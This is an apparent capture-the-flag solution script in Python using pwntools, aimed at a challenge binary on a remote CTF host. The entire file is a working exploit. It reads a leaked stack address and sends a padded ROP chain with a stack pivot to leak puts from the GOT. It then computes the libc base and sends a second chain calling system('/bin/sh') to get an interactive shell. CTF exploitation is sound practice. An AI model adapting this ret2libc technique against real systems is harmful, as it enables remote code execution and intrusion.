#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = remote("chall.v1t.site", 30150)

io.recvuntil(b"help: 0x")
stack = int(io.recvline().strip().decode(), 16)

io.sendline(flat(flat(0x0, 0x0040101a, 0x00401214, exe.got.puts, exe.plt.puts, exe.sym.main).ljust(96, b"\x00"), p64(stack), 0x401259))
libc.address = u64(io.recvlines(2)[0].ljust(8, b"\x00")) - libc.sym.puts

io.recvuntil(b"help: 0x")
stack = int(io.recvline().strip().decode(), 16)

io.sendline(flat(flat(0x0, 0x0040101a, 0x00401214, next(libc.search(b"/bin/sh")), 0x0040101a, libc.sym.system).ljust(96, b"\x00"), p64(stack), 0x401259))
io.interactive()
